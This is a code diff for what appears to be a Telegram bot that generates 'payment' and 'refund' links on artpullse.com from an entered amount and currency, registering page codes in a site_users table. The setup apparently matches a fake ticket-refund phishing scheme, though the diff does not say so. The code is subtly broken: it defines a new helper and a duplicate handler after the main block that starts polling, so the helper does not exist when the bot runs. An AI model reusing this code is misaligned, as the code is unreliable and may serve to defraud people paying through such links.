@@ -1342,7 +1342,9 @@ async def manual_payment_amount_handler(message: types.Message):
             if payment_type == 'defolt':
                 link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1"
             else:
-                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}"
+                # Генеруємо унікальний page_code для refund
+                page_code = generate_unique_page_code_for_refund()
+                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}&page={page_code}"
             print(f"[DEBUG] manual_payment_amount_handler: generated link: {link}")
             sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
             user_step[uid] = None
@@ -2315,3 +2317,98 @@ if __name__ == '__main__':
         # aiogram polling
         await dp.start_polling(bot)
     asyncio.run(main())
+
+def generate_unique_page_code_for_refund():
+    c = conn.cursor()
+    # Збираємо всі зайняті page_code
+    c.execute('SELECT page_code FROM site_users')
+    busy_codes = set(row[0] for row in c.fetchall() if row[0])
+    max_attempts = 1000
+    for attempt in range(1, max_attempts+1):
+        series = (attempt - 1) // 100 + 1
+        number = (attempt - 1) % 100 + 1
+        page_code = f"R{series}-{number}"
+        if page_code in busy_codes:
+            continue
+        # Додаємо мінімальний запис у site_users
+        user_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+        c.execute('''INSERT INTO site_users (id, currency, price, page_code) VALUES (?, ?, ?, ?)''',
+                  (user_id, '', '', page_code))
+        conn.commit()
+        return page_code
+    raise Exception('Не вдалося згенерувати унікальний page_code для refund після 1000 спроб!')
+
+# --- Обробник для ручної оплати ---
+@router.message(lambda m: user_step.get(m.from_user.id) == 'manual_payment_amount')
+@ban_guard
+async def manual_payment_amount_handler(message: types.Message):
+    try:
+        uid = message.from_user.id
+        back_kb = ReplyKeyboardMarkup(
+            keyboard=[[KeyboardButton(text="⬅️ Назад")]],
+            resize_keyboard=True
+        )
+        # Скидання за ключовим словом "назад"
+        if message.text and "назад" in message.text.lower():
+            user_step[uid] = None
+            manual_payment_attempts.pop(uid, None)
+            payment_type_by_uid.pop(uid, None)
+            for mid in bot_message_ids.get(uid, []):
+                try:
+                    await message.bot.delete_message(uid, mid)
+                except Exception:
+                    pass
+            bot_message_ids[uid] = []
+            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+            await message.answer("Возврат в главное меню.", reply_markup=ReplyKeyboardRemove())
+            await message.answer("Головне меню:", reply_markup=kb)
+            return
+        m = re.match(r"^([0-9]+(?:[.,][0-9]+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
+        if m:
+            amount = m.group(1).replace(',', '.')
+            currency = m.group(2).upper()
+            payment_type = payment_type_by_uid.get(uid, 'refund')
+            print(f"[DEBUG] manual_payment_amount_handler: payment_type={payment_type}, amount={amount}, currency={currency}")
+            if payment_type == 'defolt':
+                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1"
+            else:
+                # Генеруємо унікальний page_code для refund
+                page_code = generate_unique_page_code_for_refund()
+                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}&page={page_code}"
+            print(f"[DEBUG] manual_payment_amount_handler: generated link: {link}")
+            sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
+            user_step[uid] = None
+            manual_payment_attempts.pop(uid, None)
+            payment_type_by_uid.pop(uid, None)
+            for mid in bot_message_ids.get(uid, []):
+                try:
+                    await message.bot.delete_message(uid, mid)
+                except Exception:
+                    pass
+            bot_message_ids[uid] = []
+            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+            await message.answer("Головне меню:", reply_markup=kb)
+            return
+        else:
+            # Лічильник спроб
+            manual_payment_attempts[uid] = manual_payment_attempts.get(uid, 0) + 1
+            if manual_payment_attempts[uid] >= 2:
+                user_step[uid] = None
+                manual_payment_attempts.pop(uid, None)
+                # --- Видалити всі попередні повідомлення з кнопками, якщо є ---
+                for mid in bot_message_ids.get(uid, []):
+                    try:
+                        await message.bot.delete_message(uid, mid)
+                    except Exception:
+                        pass
+                bot_message_ids[uid] = []
+                kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+                await message.answer("❗️ Формат невірний. Ви повернуті в головне меню.", reply_markup=kb)
+            else:
+                # --- Додаємо id повідомлення з кнопками у список ---
+                msg = await message.answer("❗️ Введіть суму і валюту через пробел (наприклад: 45 EUR або 100 USD):", reply_markup=back_kb)
+                bot_message_ids.setdefault(uid, []).append(msg.message_id)
+    except Exception as e:
+        user_step[message.from_user.id] = None
+        manual_payment_attempts.pop(message.from_user.id, None)
+        await message.answer(f"Сталася помилка: {e}")
